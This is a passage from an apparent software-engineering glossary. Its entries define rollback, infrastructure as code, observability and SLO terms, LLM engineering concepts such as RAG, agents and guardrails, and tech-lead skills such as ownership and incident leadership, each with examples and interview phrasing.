**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** Rollback means returning the running system to a prior known-good version—application, configuration, or infrastructure state—after a failed deploy or incident. Database compatibility is often the constraint: forward-only migrations, expand/contract patterns, and feature flags determine whether a code rollback remains safe.

**Practical example:** After elevated 5xx rates, ops redeploys the previous container digest from the registry and verifies [Observability](./18-observability.md) recovery before closing the change.

**Interview usage:** “We rehearsed rollback: pinned artifacts, migration symmetry, and a runbook that matched our [CI/CD and DevOps](./17-ci-cd-and-devops.md) promotion path.”

**Common confusion:** Rolling back code without a matching schema or cache contract can corrupt data or amplify outages.

**Related terms:** Blue/green deployment, Canary deployment, Artifact, Continuous delivery

**Tech Lead note:** Insist on rollback criteria before deploy—teams without a rehearsed path learn under fire.

### Infrastructure as Code (IaC)

**Area:** CI/CD and DevOps ([CI/CD and DevOps](./17-ci-cd-and-devops.md))

**Definition:** Infrastructure as Code provisions and updates cloud and platform resources through version-controlled definitions—Terraform, Pulumi, AWS CDK—rather than manual console changes. Plans (`terraform plan`, diff reviews) turn infrastructure edits into reviewable, repeatable operations aligned with standard promotion and review practices in [CI/CD and DevOps](./17-ci-cd-and-devops.md).

**Practical example:** A Terraform module declares VPC, subnets, and EKS; a merge to `main` applies after policy-as-code and peer review, with state stored remotely and locked.

**Interview usage:** “We moved from snowflake accounts to IaC with modules, drift detection, and environment promotion from the same codebase.”

**Common confusion:** Storing YAML without plan/apply discipline or state management is not IaC if changes still happen outside the pipeline.

**Related terms:** Pipeline, Continuous delivery, Artifact

## Observability and Performance

### Log

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** A log is a timestamped record of discrete events—requests, errors, audit actions—emitted by applications and infrastructure. Structured logs (JSON with consistent fields) support reliable parsing and queries; unstructured text logs remain common in legacy systems but complicate analysis at scale.

**Practical example:** Each HTTP handler emits `{"level":"info","trace_id":"abc","path":"/checkout","duration_ms":120}` consumed by your log platform.

**Interview usage:** “We standardized structured fields and sampling rules so logs complemented traces without bankrupting spend.”

**Common confusion:** Logging everything at `DEBUG` in production is not observability; it is noise and cost without an indexing strategy.

**Related terms:** Trace, Correlation ID, Metric, OpenTelemetry

### Metric

**Area:** Observability and performance ([Observability](./18-observability.md), [Performance and Scalability](./19-performance-and-scalability.md))

**Definition:** Metrics are numeric measurements collected over time—counters (events), gauges (point-in-time values), histograms (distributions such as latency). Systems like Prometheus or Amazon CloudWatch scrape or ingest series for alerting, dashboards, and capacity work in [Performance and Scalability](./19-performance-and-scalability.md).

**Practical example:** A histogram records checkout latency; alerting uses p99 against an SLO window rather than mean, which hides tail risk.

**Interview usage:** “We defined RED/USE-style metrics per service so on-call could narrow incidents without tailing raw logs first.”

**Common confusion:** Dashboards without SLO grounding measure activity, not user-impacting reliability.

**Related terms:** SLI, SLO, Histogram, Prometheus

### Trace

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** A trace captures the end-to-end path of a single logical request across processes and services. It consists of spans (timed operations), each with a trace ID shared across the tree and parent-child span relationships that reconstruct call structure.

**Practical example:** A browser request creates a root span; each downstream gRPC call becomes a child span with propagated context so slow dependency is visible as a subtree.

**Interview usage:** “We required trace context propagation on every internal client so gaps didn’t hide half the graph.”

**Common confusion:** Per-process timing logs without shared trace IDs are not traces; they cannot reconstruct cross-service critical paths.

**Related terms:** Distributed tracing, Span, OpenTelemetry, Correlation ID

### SLI (Service Level Indicator)

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** An SLI is a quantitative measure of how a service behaves from a user or consumer perspective—latency percentiles, availability, success ratio, freshness. Good SLIs align with what customers actually experience rather than internal vanity metrics.

**Practical example:** “Successful checkout calls completing under 800ms” measured over valid HTTP 200 responses versus total attempts.

**Interview usage:** “We picked SLIs tied to journeys—search latency and zero-result rate—not CPU idle.”

**Common confusion:** Infrastructure uptime SLIs without application correctness confuse “ping succeeds” with “users succeed.”

**Related terms:** SLO, SLA, Error budget, Metric

### SLO (Service Level Objective)

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** An SLO is a target for an SLI over a time window—e.g., 99.9% of successful requests under 500ms monthly, or 99.95% availability rolled over thirty days. SLOs drive error budgets and prioritize engineering work versus feature velocity.

**Practical example:** If monthly availability SLO is 99.9%, roughly 43 minutes of bad availability is allowable before the budget is exhausted for that window.

**Interview usage:** “We published SLOs internally and used burn-rate alerts so we reacted before users felt chronic pain.”

**Common confusion:** Aspirational percentages without measurement definitions and exclusion rules produce arguments, not engineering decisions.

**Related terms:** SLI, SLA, Error budget, Metric

**Tech Lead note:** Credibility lives in measured SLOs—negotiate them with PMs and own the trade-offs when the budget burns.

### SLA (Service Level Agreement)

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** An SLA is a contractual commitment between provider and customer, often referencing SLO-style thresholds and defining remedies or credits when breached. SLAs are external promises; internal teams usually operate to tighter SLOs than customer-facing SLAs to preserve margin.

**Practical example:** A vendor contract guarantees 99.5% monthly API uptime or service credits; engineering monitors 99.9% internally.

**Interview usage:** “We kept internal SLOs stricter than the SLA so we had buffer before contractual breach.”

**Common confusion:** Labeling an internal goal an “SLA” without legal consequences dilutes language and confuses incident severity.

**Related terms:** SLO, SLI, Error budget, Stakeholder management

### Error budget

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** The error budget is the allowable unreliability implied by an SLO—conceptually 100% minus the SLO target over the window—spent on deploys, incidents, and maintenance. Exhausting the budget triggers policy: freeze risky releases, focus on reliability, or renegotiate the SLO.

**Practical example:** At 99.9% successful requests monthly, about 0.1% may fail “for free”; multi-hour outages can consume the entire budget at once.

**Interview usage:** “We treated the error budget as a product decision: shipping paused when burn accelerated, not when someone felt nervous.”

**Common confusion:** Error budget is not “extra downtime to use up”; it is a risk envelope for informed trade-offs.

**Related terms:** SLO, SLI, Canary deployment, Incident leadership

### Correlation ID

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** A correlation ID is a unique identifier generated at a request’s entry point and propagated through logs and sometimes metrics so operators can stitch related events across services even before full distributed tracing adoption.

**Practical example:** An API gateway adds `X-Request-ID`; each service logs it, enabling grep-free log correlation in the observability backend.

**Interview usage:** “We mandated correlation IDs on ingress and middleware so support tickets mapped to log partitions.”

**Common confusion:** Reusing trace ID and correlation ID interchangeably without propagating both standards confuses tooling expectations.

**Related terms:** Log, Trace, Distributed tracing, OpenTelemetry

### Distributed tracing

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** Distributed tracing collects span data across service boundaries, assembles traces, and visualizes latency and dependency graphs. Tools like Jaeger or Zipkin store and query traces; instrumentation must propagate context consistently or traces fragment.

**Practical example:** A service mesh injects headers; application SDKs continue the span context so a single slow database appears as a child span with its statement attributes (sanitized).

**Interview usage:** “We rolled out tracing SDKs per language and blocked merges that dropped context on internal calls.”

**Common confusion:** Partial instrumentation gives misleading traces—always sample and head-span policies matter for cost.

**Related terms:** Trace, OpenTelemetry, Span, Metric

### OpenTelemetry

**Area:** Observability ([Observability](./18-observability.md))

**Definition:** OpenTelemetry is a vendor-neutral specification and instrumentation stack for traces, metrics, and logs: language SDKs, auto-instrumentation, exporters, and a collector that can receive, process, and forward telemetry to backends. It reduces lock-in compared to proprietary agents.

**Practical example:** Services export OTLP to a collector that fans out to Prometheus for metrics and a tracing backend, with resource attributes for environment and service version.

**Interview usage:** “We standardized on OpenTelemetry so new services didn’t debate APM vendors before shipping telemetry.”

**Common confusion:** Installing the collector without semantic conventions still yields inconsistent attribute keys across teams.

**Related terms:** Trace, Metric, Log, Distributed tracing

## AI Usage in Software Engineering

### Prompt engineering

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** Prompt engineering is the deliberate design of inputs—system instructions, user prompts, and examples—to steer a large language model toward correct format, tone, and factual grounding. Techniques include few-shot exemplars, chain-of-thought elicitation where appropriate, and explicit constraints that reduce ambiguity.

**Practical example:** A code-review assistant specifies output as JSON with fields `severity`, `file`, `line`, and `suggestion`, plus two in-repo examples of acceptable findings.

**Interview usage:** “We versioned system prompts and regression-tested them on a labeled set—prompts are part of the product surface.”

**Common confusion:** Longer prompts do not guarantee better results; clarity, examples, and evals beat verbosity.

**Related terms:** RAG, Guardrail, Hallucination, Agent

### RAG (Retrieval-Augmented Generation)

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** Retrieval-augmented generation grounds answers by retrieving relevant documents or code chunks from a knowledge base and supplying them as context to the model at inference time. That coupling reduces confabulation on factual questions but shifts quality to retrieval, chunking, and citation hygiene.

**Practical example:** Support bot retrieves the top five internal wiki chunks for “password reset SLA,” injects them into the prompt, and asks the model to answer only from cited passages.

**Interview usage:** “We treated RAG as an information architecture problem—embeddings, deduplication, and eval sets for retrieval hit rate—not only prompt polish.”

**Common confusion:** RAG does not eliminate hallucination when retrieved context is incomplete or contradicts itself; rank fusion and human review still matter.

**Related terms:** Embedding, Vector database, Hallucination, Guardrail

**Tech Lead note:** Standardize what may enter the corpus—licensing, PII, and staleness are your governance surface, not the model vendor alone.

### Embedding

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** An embedding is a dense vector representation produced by a model such that semantically similar texts map to nearby points in high-dimensional space. Embeddings power semantic search, clustering, deduplication, and as the indexing layer for retrieval in [AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md) pipelines over code or docs.

**Practical example:** Each function docstring is embedded with a code-specialized model; nearest-neighbor search returns candidate modules during onboarding Q&A.

**Interview usage:** “We compared embedding models on recall@k for our ticket taxonomy before committing to a vector stack.”

**Common confusion:** Treating embeddings as universal—same model for legal prose and stack traces—often wastes precision; domain fine-tuning or hybrid lexical search may win.

**Related terms:** Vector database, RAG, Prompt engineering, Semantic search

### Vector database

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** A vector database stores high-dimensional embeddings and supports fast approximate nearest neighbor (ANN) queries under constraints like filters and namespaces. It complements traditional OLTP/search engines where similarity, not exact keys, is the access pattern.

**Practical example:** Pinecone, pgvector, or Milvus holds document chunks keyed by tenant; queries return IDs hydrated from PostgreSQL for authoritative text.

**Interview usage:** “We sized ANN indices for recall targets and p95 query latency, and kept authoritative rows in a system of record.”

**Common confusion:** Calling any Postgres table with a vector column “the knowledge base” skips freshness, delete propagation, and evaluation of neighbor quality.

**Related terms:** Embedding, RAG, Metric

### Agent

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** An agent is an LLM-driven system that plans—or reactively loops—and executes multi-step workflows by calling tools, observing results, and adapting. Reliability depends on tool contracts, stop conditions, budgets (tokens, time, money), and guardrails.

**Practical example:** An internal agent opens a ticket API, queries logs via a read-only tool, drafts a probable root cause, and stops if confidence is below threshold.

**Interview usage:** “We constrained agents with explicit tool schemas, allowlists, and human approval for mutating operations.”

**Common confusion:** Branding any chat wrapper an “agent” blurs the line from single-shot completion; observe-iterate loops and verifiable side effects define the real pattern.

**Related terms:** Tool use / function calling, Guardrail, Prompt engineering, Hallucination

**Tech Lead note:** Own the failure modes—unbounded loops and silent mutations erode trust faster than wrong wording.

### Tool use / function calling

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** Tool use (function calling) lets models emit structured calls—name and JSON arguments—to functions you implement, bridging LLM reasoning to databases, APIs, and local actions. The runtime executes tools, returns observations, and continues the conversation or plan.

**Practical example:** The model emits `get_order(order_id="...")`; the host runs it against the orders service with service credentials, then feeds the JSON back as the next message.

**Interview usage:** “We treated tool schemas like public APIs—pagination, idempotency keys, and explicit error shapes kept agents debuggable.”

**Common confusion:** Exposing raw SQL or shell without scoping is not “empowering the model”; it is an incident waiting for credentials.

**Related terms:** Agent, Guardrail, RAG, Observability

### Hallucination

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** Hallucination is confident generation of plausible content that is factually wrong, nonexistent, or misaligned with sources—APIs that never existed, citations that do not parse, or policies invented under pressure. Mitigations include retrieval, citations, calculators, tests, and human review on critical paths.

**Practical example:** A model proposes `fetchUserV3` when only `v2` exists; CI attaches static analysis or schema checks before suggestions merge.

**Interview usage:** “We never shipped model output to customers without RAG grounding on our corpus and automated citation checks on internal answers.”

**Common confusion:** Expecting temperature tuning alone to fix factual errors; structure, tools, and verification dominate for engineering use cases.

**Related terms:** RAG, Guardrail, Prompt engineering, Tool use / function calling

### Guardrail

**Area:** AI in software engineering ([AI Usage in Software Engineering](./21-ai-usage-in-software-engineering.md))

**Definition:** Guardrails are constraints on prompts, tool calls, or outputs—policy filters, schema validation, rate limits, PII redaction, toxicity classifiers, and refusal rules—to meet safety, accuracy, or compliance needs. They sit beside the model as enforceable gates, not polite instructions.

**Practical example:** A post-processor blocks responses lacking two citations for medical advice; another strips secrets matching regex patterns before logging in [Observability](./18-observability.md).

**Interview usage:** “Guardrails were part of our threat model: least-privilege tools, output JSON schema enforcement, and audit trails.”

**Common confusion:** Prompt-only pleas (“do not leak secrets”) without runtime checks fail the moment context pushes the model sideways.

**Related terms:** Agent, Tool use / function calling, Hallucination, Stakeholder management

## Leadership and Soft Skills

### Ownership

**Area:** Leadership and soft skills ([Soft Skills](./22-soft-skills.md), [Tech Lead Skills](./23-tech-lead-skills.md))

**Definition:** Ownership is end-to-end responsibility for an outcome—clarifying requirements, shipping safely, operating in production, and closing the loop on incidents and follow-ups—not merely completing assigned tasks. It includes escalating early when constraints block delivery and documenting decisions others depend on.

**Practical example:** After a partial outage, the owner drives the postmortem, tracks remediation tickets, and verifies SLO recovery rather than handing off a bullet list.

**Interview usage:** “I owned the migration triple: code, data movement, and rollback drills—I didn’t stop at merge.”

**Common confusion:** Heroic solo saves without handoffs or runbooks are not ownership; durable systems and shared context are.

**Related terms:** Accountability, Incident leadership, Technical debt, Stakeholder management

**Tech Lead note:** Model ownership by slice of customer value, not title—ambiguous boundaries create gaps during incidents.

### Accountability

**Area:** Leadership and soft skills ([Soft Skills](./22-soft-skills.md), [Tech Lead Skills](./23-tech-lead-skills.md))

**Definition:** Accountability means being answerable for results and learning from misses without collapsing into blame. Constructive accountability pairs clear commitments with transparent status, retrospectives focused on systems, and proportional consequences aligned to intent and impact.

**Practical example:** The lead states, “I approved the risky deploy window; here is what we missed in the checklist,” and updates stakeholders with a dated remediation plan.

**Interview usage:** “We separated person-blame from process accountability—roles, checks, and metrics—not theatre in postmortems.”

**Common confusion:** Confusing accountability with punishment; fear-based cultures hide failures and repeat them.

**Related terms:** Ownership, Feedback, Incident leadership, Stakeholder management

### Mentoring

**Area:** Leadership and soft skills ([Soft Skills](./22-soft-skills.md), [Tech Lead Skills](./23-tech-lead-skills.md))

**Definition:** Mentoring develops others through guided practice—pairing, structured feedback, and increasingly autonomous scope—while transferring judgment, not only syntax. Scaffolding means adjusting support as the mentee’s skill grows so dependence does not become permanent.

**Practical example:** You co-design a service extraction, let them drive commits, then review against a rubric covering operability and tests.

**Interview usage:** “I balanced stretch goals with protected learning time and debriefed decisions out loud so patterns stuck.”

**Common confusion:** Answering every question immediately feels helpful but blocks growth; teach search strategies and decision frameworks.

**Related terms:** Feedback, Ownership, Prioritization, Technical debt

### Feedback

**Area:** Leadership and soft skills ([Soft Skills](./22-soft-skills.md))

**Definition:** Feedback is specific, actionable information about behavior or work product and its effect. The SBI model structures it as Situation (when/where), Behavior (what was observed), and Impact (on team, users, or goals), which reduces defensiveness versus vague labels like “not senior enough.”

**Practical example:** “In yesterday’s design review (S), you dismissed the junior proposal before asking clarifying questions (B), which quieted input we needed for latency trade-offs (I).”

**Interview usage:** “I default to SBI and separate appreciation, coaching, and evaluation so people know which conversation we are in.”

**Common confusion:** Sandwiching criticism between praise often muddles the message; clarity and kindness are not opposites.

**Related terms:** Mentoring, Accountability, Stakeholder management, Prioritization

### Stakeholder management

**Area:** Leadership and soft skills ([Soft Skills](./22-soft-skills.md), [Tech Lead Skills](./23-tech-lead-skills.md))

**Definition:** Stakeholder management identifies who is affected by technical choices, establishes communication rhythms, and sets realistic expectations on scope, risk, and timelines. It translates technical uncertainty into decision-ready options with trade-offs rather than hiding noise behind jargon.

**Practical example:** You give product a weekly risk rollup during the monolith decomposition—milestones, blast radius, and rollback posture—so roadmap bets stay informed.

**Interview usage:** “I ran a RASCI for the migration and published a one-page decision log so execs didn’t re-litigate architecture in Slack.”

**Common confusion:** Treating stakeholders only as approvers; early skeptics often surface constraints that prevent late surprises.

**Related terms:** Prioritization, SLA, Ownership, Feedback

### Prioritization

**Area:** Leadership and soft skills ([Soft Skills](./22-soft-skills.md), [Tech Lead Skills](./23-tech-lead-skills.md))

**Definition:** Prioritization decides what earns finite engineering time and explicitly defers or kills work. Frameworks like RICE (reach, impact, confidence, effort), ICE, or MoSCoW structure debate, but the hard part is aligning on one scoring model and revisiting it as learning arrives.

**Practical example:** The team scores reliability themes against feature bets using RICE and publishes the cut line so dropped items are visible, not silent.

**Interview usage:** “We made ‘not now’ explicit with reasons and revisit dates—otherwise ‘priority one’ means everything.”

**Common confusion:** Tool fetishism—spreadsheets without executive agreement on risk appetite produce false precision.

**Related terms:** Technical debt, Stakeholder management, Error budget, SLO

### Technical debt

**Area:** Leadership and soft skills ([Tech Lead Skills](./23-tech-lead-skills.md))

**Definition:** Technical debt is the future cost—slower changes, higher defect rates, operational drag—from shortcuts or outdated design versus a cleaner target state. Deliberate debt records trade-offs and repayment plans; inadvertent debt accrues from neglect, churn, or unclear ownership.

**Practical example:** Shipping a synchronous integration to meet a deadline with a ticket to add async retries and idempotency keys captures deliberate debt.

**Interview usage:** “I surfaced debt in product terms—lead time to change, incident frequency—not moral judgment about code.”

**Common confusion:** Calling all legacy code “debt”; some stable cores need little churn, and rewriting for aesthetics wastes focus.

**Related terms:** Ownership, Prioritization, Continuous delivery, Observability

**Tech Lead note:** Budget repayment like features—visible on the roadmap—or interest compounds in incidents and attrition.

### Incident leadership

**Area:** Leadership and soft skills ([Soft Skills](./22-soft-skills.md), [Tech Lead Skills](./23-tech-lead-skills.md))

**Definition:** Incident leadership coordinates technical mitigation, communication, and post-incident learning during production outages. It assigns clear roles (incident commander, communications, scribe), time-boxes updates, protects responders from thrash, and ensures follow-through on remediation in timelines backed by [Observability](./18-observability.md).

**Practical example:** The IC declares severity, freezes risky deploys, tasks a pair on rollback versus hotfix, and sends stakeholder updates every fifteen minutes with customer impact hypothesis.

**Interview usage:** “I focus incident leadership on stabilizing, communicating honestly, and converting pain into tracked remediations—not hero narratives.”

**Common confusion:** Letting the strongest debugger silently steer without a communication cadence; external silence reads as indifference.

**Related terms:** Rollback, SLO, Ownership, Accountability

**Tech Lead note:** Your calm structure matters as much as your grep skills—credibility after incidents comes from follow-up closure.